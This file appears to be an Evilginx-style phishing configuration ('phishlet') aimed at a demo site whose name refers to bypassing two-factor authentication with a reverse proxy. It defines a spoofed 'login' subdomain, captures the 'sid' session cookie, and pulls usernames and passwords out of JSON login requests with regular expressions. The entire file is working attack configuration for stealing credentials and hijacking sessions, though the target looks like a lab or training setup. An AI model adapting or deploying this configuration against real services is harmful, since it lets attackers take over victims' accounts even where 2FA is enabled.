min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'login', orig_sub: '', domain: 'project-iao-bypass-2fa-by-reverse-proxy.onrender.com', session: true, is_landing: true, auto_filter: true}

sub_filters: []

auth_tokens:
  - domain: 'project-iao-bypass-2fa-by-reverse-proxy.onrender.com'
    keys: ['sid'] 

credentials:
  username:
    key: 'identifier'
    search: '"(?:identifier|email)"\s*:\s*"([^"]+)"'
    type: 'json'
  password:
    key: 'password'
    search: '"password"\s*:\s*"([^"]+)"'
    type: 'json'

login:
  domain: 'project-iao-bypass-2fa-by-reverse-proxy.onrender.com'
  path: '/login'

